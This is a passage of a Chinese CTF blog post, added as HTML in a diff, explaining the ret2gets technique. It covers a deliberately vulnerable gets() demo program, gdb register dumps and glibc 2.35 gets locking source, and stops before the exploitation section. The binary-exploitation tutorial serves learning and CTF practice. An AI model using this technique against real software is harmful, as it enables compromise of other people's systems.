@@ -1,0 +1,1287 @@
+<!DOCTYPE html>
+<html lang="zh-cn" dir="ltr">
+    <head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script><meta charset='utf-8'>
+<meta name='viewport' content='width=device-width, initial-scale=1'><meta name='description' content="https://blog.csdn.net/2502_91269216/article/details/148261096\nhttps://zhuanlan.zhihu.com/p/1923686723877073710\n介绍 ret2gets是一种通过连续调用gets来控制rdi的手法，当程序存在gets造成的栈溢出时可以使用，尤其在缺少pop rdi的时候\n">
+<title>ret2gets</title>
+
+<link rel='canonical' href='http://localhost:1313/p/ret2gets/'>
+
+<link rel="stylesheet" href="/scss/style.min.f29951529384267183dbb2bb71dfebce8cf9e242ddf6b2d967676156070babed.css"><meta property='og:title' content="ret2gets">
+<meta property='og:description' content="https://blog.csdn.net/2502_91269216/article/details/148261096\nhttps://zhuanlan.zhihu.com/p/1923686723877073710\n介绍 ret2gets是一种通过连续调用gets来控制rdi的手法，当程序存在gets造成的栈溢出时可以使用，尤其在缺少pop rdi的时候\n">
+<meta property='og:url' content='http://localhost:1313/p/ret2gets/'>
+<meta property='og:site_name' content='FuGuang&#39;s Bolg'>
+<meta property='og:type' content='article'><meta property='article:section' content='Post' /><meta property='article:tag' content='pwn' /><meta property='article:published_time' content='2026-04-06T17:20:28&#43;08:00'/><meta property='article:modified_time' content='2026-04-06T17:20:28&#43;08:00'/><meta property='og:image' content='http://localhost:1313/image/ret2gets/ret2gets.jpg' />
+<meta name="twitter:title" content="ret2gets">
+<meta name="twitter:description" content="https://blog.csdn.net/2502_91269216/article/details/148261096\nhttps://zhuanlan.zhihu.com/p/1923686723877073710\n介绍 ret2gets是一种通过连续调用gets来控制rdi的手法，当程序存在gets造成的栈溢出时可以使用，尤其在缺少pop rdi的时候\n"><meta name="twitter:card" content="summary_large_image">
+    <meta name="twitter:image" content='http://localhost:1313/image/ret2gets/ret2gets.jpg' /><style>
+    :root {
+        --article-font-family: "Noto Serif SC", var(--base-font-family);
+    }
+</style>
+<script>  
+		(function () {
+		    const customFont = document.createElement('link');
+		    customFont.href = "https://fonts.googleapis.com/css2?family=Noto+Serif+SC:wght@400;700&display=swap";
+		
+		    customFont.type = "text/css";
+		    customFont.rel = "stylesheet";
+		
+		    document.head.appendChild(customFont);
+		}());
+</script>
+
+    </head>
+    <body class="
+    article-page
+    ">
+    <script>
+        (function() {
+            const colorSchemeKey = 'StackColorScheme';
+            if(!localStorage.getItem(colorSchemeKey)){
+                localStorage.setItem(colorSchemeKey, "auto");
+            }
+        })();
+    </script><script>
+    (function() {
+        const colorSchemeKey = 'StackColorScheme';
+        const colorSchemeItem = localStorage.getItem(colorSchemeKey);
+        const supportDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches === true;
+
+        if (colorSchemeItem == 'dark' || colorSchemeItem === 'auto' && supportDarkMode) {
+            
+
+            document.documentElement.dataset.scheme = 'dark';
+        } else {
+            document.documentElement.dataset.scheme = 'light';
+        }
+    })();
+</script>
+<div class="container main-container flex on-phone--column extended"><aside class="sidebar left-sidebar sticky ">
+    <button class="hamburger hamburger--spin" type="button" id="toggle-menu" aria-label="切换菜单">
+        <span class="hamburger-box">
+            <span class="hamburger-inner"></span>
+        </span>
+    </button>
+
+    <header>
+        
+            
+            <figure class="site-avatar">
+                <a href="/">
+                
+                    
+                    
+                    
+                        
+                        <img src="/img/avatar_hu_c17c68125d7ac105.png" width="300"
+                            height="300" class="site-logo" loading="lazy" alt="Avatar">
+                    
+                
+                </a>
+                
+                    <span class="emoji">🍥</span>
+                
+            </figure>
+            
+        
+        
+        <div class="site-meta">
+            <h1 class="site-name"><a href="/">FuGuang&#39;s Bolg</a></h1>
+            <h2 class="site-description">向左向右但别退后</h2>
+        </div>
+    </header><ol class="menu-social">
+            
+                <li>
+                    <a 
+                        href='https://github.com/fu9-dotom/fu9-dotom.github.io'
+                        target="_blank"
+                        title="GitHub"
+                        rel="me"
+                    >
+                        
+                        
+                            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-brand-github" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z" fill="none"/>
+  <path d="M9 19c-4.3 1.4 -4.3 -2.5 -6 -3m12 5v-3.5c0 -1 .1 -1.4 -.5 -2c2.8 -.3 5.5 -1.4 5.5 -6a4.6 4.6 0 0 0 -1.3 -3.2a4.2 4.2 0 0 0 -.1 -3.2s-1.1 -.3 -3.5 1.3a12.3 12.3 0 0 0 -6.2 0c-2.4 -1.6 -3.5 -1.3 -3.5 -1.3a4.2 4.2 0 0 0 -.1 3.2a4.6 4.6 0 0 0 -1.3 3.2c0 4.6 2.7 5.7 5.5 6c-.6 .6 -.6 1.2 -.5 2v3.5" />
+</svg>
+
+
+
+                        
+                    </a>
+                </li>
+            
+        </ol><ol class="menu" id="main-menu">
+        
+        
+        
+        <li >
+            <a href='/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-home" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <polyline points="5 12 3 12 12 3 21 12 19 12" />
+  <path d="M5 12v7a2 2 0 0 0 2 2h10a2 2 0 0 0 2 -2v-7" />
+  <path d="M9 21v-6a2 2 0 0 1 2 -2h2a2 2 0 0 1 2 2v6" />
+</svg>
+
+
+
+                
+                <span>主页</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/%E5%85%B3%E4%BA%8E/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-user" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="12" cy="7" r="4" />
+  <path d="M6 21v-2a4 4 0 0 1 4 -4h4a4 4 0 0 1 4 4v2" />
+</svg>
+
+
+
+                
+                <span>关于</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/archives/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-archive" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <rect x="3" y="4" width="18" height="4" rx="2" />
+  <path d="M5 8v10a2 2 0 0 0 2 2h10a2 2 0 0 0 2 -2v-10" />
+  <line x1="10" y1="12" x2="14" y2="12" />
+</svg>
+
+
+
+                
+                <span>归档</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/search/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-search" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="10" cy="10" r="7" />
+  <line x1="21" y1="21" x2="15" y2="15" />
+</svg>
+
+
+
+                
+                <span>Search</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/links/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-link" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <path d="M10 14a3.5 3.5 0 0 0 5 0l4 -4a3.5 3.5 0 0 0 -5 -5l-.5 .5" />
+  <path d="M14 10a3.5 3.5 0 0 0 -5 0l-4 4a3.5 3.5 0 0 0 5 5l.5 -.5" />
+</svg>
+
+
+
+                
+                <span>Links</span>
+            </a>
+        </li>
+        
+        <li class="menu-bottom-section">
+            <ol class="menu">
+
+                
+                    <li id="dark-mode-toggle">
+                        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-left" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="8" cy="12" r="2" />
+  <rect x="2" y="6" width="20" height="12" rx="6" />
+</svg>
+
+
+
+                        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-right" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="16" cy="12" r="2" />
+  <rect x="2" y="6" width="20" height="12" rx="6" />
+</svg>
+
+
+
+                        <span>暗色模式</span>
+                    </li>
+                
+            </ol>
+        </li>
+    </ol>
+</aside>
+
+    <aside class="sidebar right-sidebar sticky">
+        
+            
+                
+    <section class="widget archives">
+        <div class="widget-icon">
+            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-hash" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <line x1="5" y1="9" x2="19" y2="9" />
+  <line x1="5" y1="15" x2="19" y2="15" />
+  <line x1="11" y1="4" x2="7" y2="20" />
+  <line x1="17" y1="4" x2="13" y2="20" />
+</svg>
+
+
+
+        </div>
+        <h2 class="widget-title section-title">目录</h2>
+        
+        <div class="widget--toc">
+            <nav id="TableOfContents">
+  <ol>
+    <li><a href="#介绍">介绍</a></li>
+    <li><a href="#源码分析">源码分析</a></li>
+    <li><a href="#利用方法">利用方法</a></li>
+  </ol>
+</nav>
+        </div>
+    </section>
+
+            
+        
+    </aside>
+
+
+            <main class="main full-width">
+    <article class="has-image main-article">
+    <header class="article-header">
+        <div class="article-image">
+            <a href="/p/ret2gets/">
+                
+                    <img src="/image/ret2gets/ret2gets.jpg" loading="lazy" alt="Featured image of post ret2gets" />
+                
+            </a>
+        </div>
+    
+
+    <div class="article-details">
+    
+    <header class="article-category">
+        
+            <a href="/categories/pwn/" style="background-color: #2a9d8f; color: #fff;">
+                Pwn
+            </a>
+        
+    </header>
+    
+
+    <div class="article-title-wrapper">
+        <h2 class="article-title">
+            <a href="/p/ret2gets/">ret2gets</a>
+        </h2>
+    
+        
+    </div>
+
+    
+    
+    
+    
+    <footer class="article-time">
+        
+            <div>
+                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-calendar-time" width="56" height="56" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <path d="M11.795 21h-6.795a2 2 0 0 1 -2 -2v-12a2 2 0 0 1 2 -2h12a2 2 0 0 1 2 2v4" />
+  <circle cx="18" cy="18" r="4" />
+  <path d="M15 3v4" />
+  <path d="M7 3v4" />
+  <path d="M3 11h16" />
+  <path d="M18 16.496v1.504l1 1" />
+</svg>
+                <time class="article-time--published">Apr 06, 2026</time>
+            </div>
+        
+
+        
+    </footer>
+    
+
+    
+</div>
+
+</header>
+
+    <section class="article-content">
+    
+    
+    <p><a class="link" href="https://blog.csdn.net/2502_91269216/article/details/148261096"  target="_blank" rel="noopener"
+    >https://blog.csdn.net/2502_91269216/article/details/148261096</a></p>
+<p><a class="link" href="https://zhuanlan.zhihu.com/p/1923686723877073710"  target="_blank" rel="noopener"
+    >https://zhuanlan.zhihu.com/p/1923686723877073710</a></p>
+<h2 id="介绍">介绍
+</h2><p>ret2gets是一种通过连续调用gets来控制rdi的手法，当程序存在gets造成的栈溢出时可以使用，尤其在缺少pop rdi的时候</p>
+<p>这里一个小demo讲解</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1">#include&lt;stdio.h&gt;</span>
+</span></span><span class="line"><span class="cl">void win<span class="o">()</span>
+</span></span><span class="line"><span class="cl"><span class="o">{</span>
+</span></span><span class="line"><span class="cl">    system<span class="o">(</span><span class="s1">&#39;666&#39;</span><span class="o">)</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="o">}</span>
+</span></span><span class="line"><span class="cl">int main<span class="o">()</span>
+</span></span><span class="line"><span class="cl"><span class="o">{</span>
+</span></span><span class="line"><span class="cl">    char buf<span class="o">[</span>0x20<span class="o">]</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    puts<span class="o">(</span><span class="s2">&#34;ret2gets&#34;</span><span class="o">)</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    gets<span class="o">(</span>buf<span class="o">)</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> 0<span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="o">}</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>我们执行gets之前</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"> ► 0x40117d &lt;main+39&gt;    call   gets@plt                      &lt;gets@plt&gt;
+</span></span><span class="line"><span class="cl">        rdi: 0x7fff71460a20 —▸ 0x7fff71460dc9 ◂— 0x34365f363878 /* <span class="s1">&#39;x86_64&#39;</span> */
+</span></span><span class="line"><span class="cl">        rsi: 0x1
+</span></span><span class="line"><span class="cl">        rdx: 0x1
+</span></span><span class="line"><span class="cl">        rcx: 0x74453af14907 <span class="o">(</span>write+23<span class="o">)</span> ◂— cmp rax, -0x1000 /* <span class="s1">&#39;H=&#39;</span> */
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>rdi是一个栈地址，也是gets的参数</p>
+<p>单步执行后查看即将退出gets时的寄存器情况</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"> RAX  0x7ffdcee7bd40 ◂— 0x7ffd00313131 /* <span class="s1">&#39;111&#39;</span> */
+</span></span><span class="line"><span class="cl">*RBX  0x0
+</span></span><span class="line"><span class="cl"> RCX  0x704680c1aaa0 <span class="o">(</span>_IO_2_1_stdin_<span class="o">)</span> ◂— 0xfbad2088
+</span></span><span class="line"><span class="cl">*RDX  0x1
+</span></span><span class="line"><span class="cl">*RDI  0x704680c1ca80 <span class="o">(</span>_IO_stdfile_0_lock<span class="o">)</span> ◂— 0x0#这里
+</span></span><span class="line"><span class="cl">*RSI  0x1
+</span></span><span class="line"><span class="cl"> R8   0x0
+</span></span><span class="line"><span class="cl"> R9   0x0
+</span></span><span class="line"><span class="cl"> R10  0x77
+</span></span><span class="line"><span class="cl"> R11  0x246
+</span></span><span class="line"><span class="cl">*R12  0x7ffdcee7be78 —▸ 0x7ffdcee7c0f9 ◂— 0x53006f6d65642f2e /* <span class="s1">&#39;./demo&#39;</span> */
+</span></span><span class="line"><span class="cl">*R13  0x401156 <span class="o">(</span>main<span class="o">)</span> ◂— endbr64 
+</span></span><span class="line"><span class="cl"> R14  0x4030f8 <span class="o">(</span>__do_global_dtors_aux_fini_array_entry<span class="o">)</span> —▸ 0x401120 <span class="o">(</span>__do_global_dtors_aux<span class="o">)</span> ◂— endbr64 
+</span></span><span class="line"><span class="cl"> R15  0x704680e30040 <span class="o">(</span>_rtld_global<span class="o">)</span> —▸ 0x704680e312e0 ◂— 0x0
+</span></span><span class="line"><span class="cl">*RBP  0x7ffdcee7bd60 ◂— 0x1
+</span></span><span class="line"><span class="cl">*RSP  0x7ffdcee7bd40 ◂— 0x7ffd00313131 /* <span class="s1">&#39;111&#39;</span> */
+</span></span><span class="line"><span class="cl">*RIP  0x401182 <span class="o">(</span>main+44<span class="o">)</span> ◂— mov eax, <span class="m">0</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>发现rdi的值变为_IO_stdfile_0_lock</p>
+<p>关于_IO_stdfile_0_lock,其实就是一个用来保证线程安全的锁，防止多线程下多个线程同时访问同一FILE</p>
+<p>gets函数执行之后rdi所指向的其实就是FILE结构体的的_IO_lock_t *_lock;也就是锁</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="k">typedef</span> <span class="k">struct</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="kt">int</span> <span class="n">lock</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="kt">int</span> <span class="n">cnt</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="kt">void</span> <span class="o">*</span><span class="n">owner</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span> <span class="n">_IO_lock_t</span><span class="p">;</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>该结构题里的owner储存的是TLS的地址(每个持有锁的线程的私有空间的起始地址)，该地址与libc偏移固定。</p>
+<p>由于rdi指向这个_IO_stdfile_0_lock，所以ret2gets的基本思想就是在调用gets之后再次调用gets,修改_IO_stdfile_0_lock的内容从而控制rdi</p>
+<h2 id="源码分析">源码分析
+</h2><p>glibc2.35 gets源码</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span><span class="lnt">38
+</span><span class="lnt">39
+</span><span class="lnt">40
+</span><span class="lnt">41
+</span><span class="lnt">42
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="kt">char</span> <span class="o">*</span>
+</span></span><span class="line"><span class="cl"><span class="nf">_IO_gets</span> <span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="n">buf</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl"><span class="kt">size_t</span> <span class="n">count</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="kt">int</span> <span class="n">ch</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="kt">char</span> <span class="o">*</span><span class="n">retval</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">  <span class="nf">_IO_acquire_lock</span> <span class="p">(</span><span class="n">stdin</span><span class="p">);</span>     <span class="c1">// 对标准输入流stdin加锁，防止多线程环境下多个线程同时操作输入流导致数据竞争
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="n">ch</span> <span class="o">=</span> <span class="nf">_IO_getc_unlocked</span> <span class="p">(</span><span class="n">stdin</span><span class="p">);</span>  <span class="c1">// 通过_IO_getc_unlocked无锁方式读取第一个字符
+</span></span></span><span class="line"><span class="cl"><span class="c1">// 若首字符是EOF（文件结束符或输入错误），直接返回NULL
+</span></span></span><span class="line"><span class="cl"><span class="c1">// 若首字符是换行符\n，则count=0，表示空字符串
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="k">if</span> <span class="p">(</span><span class="n">ch</span> <span class="o">==</span> <span class="n">EOF</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="p">{</span>
+</span></span><span class="line"><span class="cl">      <span class="n">retval</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="k">goto</span> <span class="n">unlock_return</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="p">(</span><span class="n">ch</span> <span class="o">==</span> <span class="sc">&#39;\n&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">count</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">else</span>
+</span></span><span class="line"><span class="cl">    <span class="p">{</span>
+</span></span><span class="line"><span class="cl"><span class="cm">/* This is very tricky since a file descriptor may be in the
+</span></span></span><span class="line"><span class="cl"><span class="cm">     non-blocking mode. The error flag doesn&#39;t mean much in this
+</span></span></span><span class="line"><span class="cl"><span class="cm">     case. We return an error only when there is a new error. */</span>
+</span></span><span class="line"><span class="cl"><span class="kt">int</span> <span class="n">old_error</span> <span class="o">=</span> <span class="n">stdin</span><span class="o">-&gt;</span><span class="n">_flags</span> <span class="o">&amp;</span> <span class="n">_IO_ERR_SEEN</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">      <span class="n">stdin</span><span class="o">-&gt;</span><span class="n">_flags</span> <span class="o">&amp;=</span> <span class="o">~</span><span class="n">_IO_ERR_SEEN</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">      <span class="n">buf</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="p">(</span><span class="kt">char</span><span class="p">)</span> <span class="n">ch</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">      <span class="n">count</span> <span class="o">=</span> <span class="nf">_IO_getline</span> <span class="p">(</span><span class="n">stdin</span><span class="p">,</span> <span class="n">buf</span> <span class="o">+</span> <span class="mi">1</span><span class="p">,</span> <span class="n">INT_MAX</span><span class="p">,</span> <span class="sc">&#39;\n&#39;</span><span class="p">,</span> <span class="mi">0</span><span class="p">)</span> <span class="o">+</span> <span class="mi">1</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="p">(</span><span class="n">stdin</span><span class="o">-&gt;</span><span class="n">_flags</span> <span class="o">&amp;</span> <span class="n">_IO_ERR_SEEN</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="p">{</span>
+</span></span><span class="line"><span class="cl">      <span class="n">retval</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="k">goto</span> <span class="n">unlock_return</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="k">else</span>
+</span></span><span class="line"><span class="cl">    <span class="n">stdin</span><span class="o">-&gt;</span><span class="n">_flags</span> <span class="o">|=</span> <span class="n">old_error</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">  <span class="n">buf</span><span class="p">[</span><span class="n">count</span><span class="p">]</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="n">retval</span> <span class="o">=</span> <span class="n">buf</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="nl">unlock_return</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">  <span class="nf">_IO_release_lock</span> <span class="p">(</span><span class="n">stdin</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="k">return</span> <span class="n">retval</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>开头结尾分别调用了_IO_acquire_lock/_IO_release_lock来获取/释放 对stdin的锁</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="cp">#  define _IO_acquire_lock(_fp) \
+</span></span></span><span class="line"><span class="cl"><span class="cp">do {									      \
+</span></span></span><span class="line"><span class="cl"><span class="cp">    FILE *_IO_acquire_lock_file						      \
+</span></span></span><span class="line"><span class="cl"><span class="cp">    __attribute__((cleanup (_IO_acquire_lock_fct)))			      \
+</span></span></span><span class="line"><span class="cl"><span class="cp">    = (_fp);							      \
+</span></span></span><span class="line"><span class="cl"><span class="cp">    _IO_flockfile (_IO_acquire_lock_file);
+</span></span></span><span class="line"><span class="cl"><span class="cp"># else
+</span></span></span><span class="line"><span class="cl"><span class="cp">#  ...
+</span></span></span><span class="line"><span class="cl"><span class="cp"># endif
+</span></span></span><span class="line"><span class="cl"><span class="cp"># define _IO_release_lock(_fp) ; } while (0)
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p>_IO_acquire_lock中调用了_IO_acquire_lock_fct和_IO_flockfile,</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"> <span class="nf">__attribute__</span><span class="p">((</span><span class="nf">cleanup</span> <span class="p">(</span><span class="n">_IO_acquire_lock_fct</span><span class="p">)))</span>			      \
+</span></span><span class="line"><span class="cl">    <span class="o">=</span> <span class="p">(</span><span class="n">_fp</span><span class="p">);</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>这句话的意思就是在fp上调用_IO_acquire_lock_fct</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span><span class="lnt">8
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="n">staticinline</span> <span class="kt">void</span>
+</span></span><span class="line"><span class="cl"><span class="nf">__attribute__</span> <span class="p">((</span><span class="n">__always_inline__</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl"><span class="nf">_IO_acquire_lock_fct</span> <span class="p">(</span><span class="n">FILE</span> <span class="o">**</span><span class="n">p</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">  <span class="n">FILE</span> <span class="o">*</span><span class="n">fp</span> <span class="o">=</span> <span class="o">*</span><span class="n">p</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="p">((</span><span class="n">fp</span><span class="o">-&gt;</span><span class="n">_flags</span> <span class="o">&amp;</span> <span class="n">_IO_USER_LOCK</span><span class="p">)</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">_IO_funlockfile</span> <span class="p">(</span><span class="n">fp</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>用于锁定和解锁的 2 个宏是_IO_flockfile和_IO_funlockfile。</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
